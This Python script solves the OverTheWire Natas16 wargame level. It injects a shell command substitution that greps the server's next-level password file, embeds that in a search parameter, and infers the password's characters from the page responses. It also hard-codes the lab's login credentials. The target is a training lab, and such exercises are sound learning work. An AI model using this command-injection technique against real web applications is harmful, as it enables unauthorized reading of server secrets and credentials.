# Natas16 bruteforce script :)
import requests, string, sys, time

# === ANSI escape codes for colors USED ONLY FOR OUTPUT STYLING ===
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
# ==================================================================

url = "http://natas16.natas.labs.overthewire.org/"
authUsername = "natas16"
authPassword = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

charData = string.ascii_letters + string.digits
matchingCharData = ""

print(f"{CYAN}[*] Starting Natas16 brute force...{RESET}")
print(f"{YELLOW}[*] Testing {len(charData)} possible characters...{RESET}\n")

for idx, i in enumerate(charData, 1):
    injection = "$(grep " + i + " /etc/natas_webpass/natas17)squid"
    tempUrl = url + "?needle=" + injection + "&submit=Search"

    # === Progress indicator USED ONLY FOR OUTPUT STYLING ===
    sys.stdout.write(f"\r{CYAN}[*] Testing char {idx}/{len(charData)}: '{i}'...{RESET}")
    sys.stdout.flush()
    # =======================================================

    response = requests.get(tempUrl, auth=(authUsername, authPassword))

    if 'squid' not in response.text:
        
        # === USED ONLY FOR OUTPUT STYLING === 
        sys.stdout.write(f"\r{GREEN}[+] Valid character found: '{i}'{RESET}\n")
        # ====================================
        
        matchingCharData += i
        time.sleep(0.05)  # small delay for nicer output

print(f"\n{GREEN}[✓] Brute force complete!{RESET}")
print(f"{YELLOW}[>] Possible password characters: {CYAN}{matchingCharData}{RESET}")
